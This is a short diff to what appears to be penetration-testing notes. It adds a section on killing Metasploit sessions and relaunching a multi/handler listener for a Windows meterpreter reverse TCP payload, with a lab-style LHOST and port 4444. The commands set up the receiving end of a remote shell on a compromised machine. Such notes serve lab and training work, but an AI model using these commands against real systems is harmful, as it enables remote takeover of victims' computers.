@@ -28,4 +28,15 @@ exploit
 
 
 
-
+#### Killing Active Sessions
+```
+sessions -K
+```
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.15.2
+set LPORT 4444
+exploit
+```
+>Note : Use same LHOST and LPORT as used previously.
